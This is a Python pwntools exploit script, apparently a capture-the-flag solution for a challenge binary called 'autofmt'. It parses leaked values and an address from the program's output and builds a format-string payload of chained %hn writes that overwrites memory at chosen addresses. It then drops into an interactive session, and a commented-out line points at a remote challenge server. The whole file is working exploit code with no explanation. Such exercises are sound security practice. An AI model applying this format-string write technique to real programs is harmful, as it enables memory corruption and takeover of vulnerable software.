from pwn import *


def padding(n):
    n = str(n)
    while len(n) != 5:
        n = '0' + n
    return n


def split_and_sort(a):
    arr = {}
    print(hex(a))
    for i in range(8):
        arr[i] = a & 0xffff
        a = a >> 16
    arr = dict(sorted(arr.items(), key=lambda item: item[1]))
    return arr


p = process('./autofmt')
# p = remote('45.122.249.68', '10015')

e = ELF('./autofmt')


r = p.recv().split(b'\n')
a = int(r[1].split(b' ')[2].decode(), 10)
b = int(r[2].split(b' ')[2].decode(), 10)
add_a = int(r[3].split(b' ')[2].decode()[2:], 16)
add_b = add_a-8

print('a = ', hex(a))
print('b = ', hex(b))
print('add a = ', hex(add_a))

arr_s = split_and_sort((a << 64) | b)  # split and sort asccending

print(arr_s)

payload = b''
prev = 0
offset = 23
count = 8

# build payload format string
for b2 in arr_s.values():
    temp = b2
    b2 = b2-prev
    if count == 8:
        payload += b'%'+str(b2).encode()+f'c%{offset}$hn'.encode()
    else:
        payload += b'%'+str(b2).encode()+f'c%{offset}$hn'.encode()

    prev = temp
    offset += 1
    count -= 1

print(len(payload))
while len(payload) % 8 != 0:
    payload += b'a'

for i in arr_s.keys():
    print(hex(add_a+2*i))
    payload += p64(add_b+2*i)


print(payload)

p.sendline(payload)
p.interactive()
